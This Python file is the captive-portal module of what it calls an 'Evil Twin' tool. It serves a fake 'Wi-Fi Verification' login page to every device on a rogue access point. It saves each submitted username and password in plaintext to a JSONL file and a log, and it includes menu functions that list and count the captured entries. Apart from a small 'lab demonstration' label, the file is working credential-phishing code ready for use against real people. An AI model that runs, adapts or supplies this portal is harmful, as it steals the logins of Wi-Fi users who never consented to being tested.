import json
import os
import time
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import parse_qs

"""

Implements the Captive Portal and credential capture stage of the Evil Twin tool.

Main responsibilities:
    - Start a local HTTP captive portal server on port 80.
    - Display a Wi-Fi verification login page to connected clients.
    - Receive submitted username and password values from the login form.
    - Save captured demo credentials to a local JSONL file.
    - Write portal activity and HTTP request logs to a log file.
    - Display and count captured credentials from the main menu.
    - Stop the captive portal service when needed.
"""

PROJECT_DIR = Path(__file__).resolve().parent
CAPTURED_CREDENTIALS = PROJECT_DIR / "captured_credentials.jsonl"
PORTAL_LOG = PROJECT_DIR / "portal.log"

AP_IP = "192.168.50.1"
PORTAL_PORT = 80

_server = None
_server_thread = None


LOGIN_PAGE = """
<!doctype html>
<html>
<head>
    <meta charset="utf-8">
    <title>Wi-Fi Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #F4F6F8;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .box {
            width: 360px;
            background: white;
            padding: 28px;
            border-radius: 14px;
            box-shadow: 0 8px 25px rgba(0,0,0,0.12);
        }
        h2 {
            margin-top: 0;
            text-align: center;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 8px;
        }
        button {
            width: 100%;
            padding: 12px;
            margin-top: 12px;
            border: 0;
            border-radius: 8px;
            background: #111827;
            color: white;
            font-size: 15px;
            cursor: pointer;
        }
        .note {
            font-size: 12px;
            color: #666;
            text-align: center;
            margin-top: 12px;
        }
    </style>
</head>
<body>
    <div class="box">
        <h2>Wi-Fi Verification</h2>
        <form method="POST" action="/login">
            <input name="username" placeholder="Username" autocomplete="off" required>
            <input name="password" placeholder="Password" type="password" required>
            <button type="submit">Continue</button>
        </form>
        <div class="note">Lab captive portal demonstration</div>
    </div>
</body>
</html>
"""


SUCCESS_PAGE = """
<!doctype html>
<html>
<head>
    <meta charset="utf-8">
    <title>Connected</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #F4F6F8;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .box {
            background: white;
            padding: 28px;
            border-radius: 14px;
            box-shadow: 0 8px 25px rgba(0,0,0,0.12);
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="box">
        <h2>Verification received</h2>
        <p>You may continue using the network.</p>
    </div>
</body>
</html>
"""


def log_portal(message: str) -> None:
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{timestamp}] {message}"
    print(line)
    with PORTAL_LOG.open("a", encoding="utf-8") as f:
        f.write(line + "\n")


def save_credentials(client_ip: str, username: str, password: str, ssid: str = "") -> None:
    record = {
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "client_ip": client_ip,
        "ssid": ssid,
        "username": username,
        "password": password,
    }

    with CAPTURED_CREDENTIALS.open("a", encoding="utf-8") as f:
        f.write(json.dumps(record, ensure_ascii=False) + "\n")

    log_portal(
        f"[CREDENTIALS CAPTURED] client={client_ip} username={username} password={password}"
    )


class CaptivePortalHandler(BaseHTTPRequestHandler):
    portal_ssid = ""

    def log_message(self, format, *args):
        log_portal(f"{self.client_address[0]} - {format % args}")

    def send_html(self, html: str, status: int = 200):
        body = html.encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        # Redirect every request to the login page.
        self.send_html(LOGIN_PAGE)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", "0"))
        raw_body = self.rfile.read(length).decode("utf-8", errors="replace")
        fields = parse_qs(raw_body)

        username = fields.get("username", [""])[0].strip()
        password = fields.get("password", [""])[0].strip()

        if self.path == "/login" and username and password:
            save_credentials(
                client_ip=self.client_address[0],
                username=username,
                password=password,
                ssid=self.portal_ssid,
            )
            self.send_html(SUCCESS_PAGE)
            return

        self.send_html(LOGIN_PAGE, status=400)


def start_captive_portal(ssid: str = "", host: str = "0.0.0.0", port: int = PORTAL_PORT):
    global _server, _server_thread

    if _server is not None:
        print("[INFO] Captive portal is already running.")
        return

    CaptivePortalHandler.portal_ssid = ssid

    PORTAL_LOG.write_text("", encoding="utf-8")

    _server = ThreadingHTTPServer((host, port), CaptivePortalHandler)

    def run_server():
        log_portal(f"[START] Captive portal started on http://{host}:{port}")
        try:
            _server.serve_forever()
        except Exception as exc:
            log_portal(f"[ERROR] Captive portal stopped with error: {exc}")

    _server_thread = threading.Thread(target=run_server, daemon=True)
    _server_thread.start()

    time.sleep(1)
    print(f"[OK] Captive portal running on http://{host}:{port}")


def stop_captive_portal():
    global _server, _server_thread

    if _server is None:
        print("[INFO] Captive portal is not running.")
        return

    log_portal("[STOP] Stopping captive portal...")
    _server.shutdown()
    _server.server_close()

    _server = None
    _server_thread = None

    print("[OK] Captive portal stopped.")


def show_captured_credentials():
    print("\n========== captured_credentials.jsonl ==========")

    if not CAPTURED_CREDENTIALS.exists():
        print("No credentials captured yet.")
        return

    text = CAPTURED_CREDENTIALS.read_text(encoding="utf-8", errors="ignore").strip()

    if not text:
        print("No credentials captured yet.")
        return

    for line in text.splitlines():
        try:
            record = json.loads(line)
            print(
                f"[{record.get('timestamp')}] "
                f"client={record.get('client_ip')} "
                f"ssid={record.get('ssid')} "
                f"username={record.get('username')} "
                f"password={record.get('password')}"
            )
        except Exception:
            print(line)


def count_captured_credentials() -> int:
    if not CAPTURED_CREDENTIALS.exists():
        return 0

    text = CAPTURED_CREDENTIALS.read_text(encoding="utf-8", errors="ignore").strip()
    if not text:
        return 0

    return len(text.splitlines())


def is_portal_running() -> bool:
    return _server is not None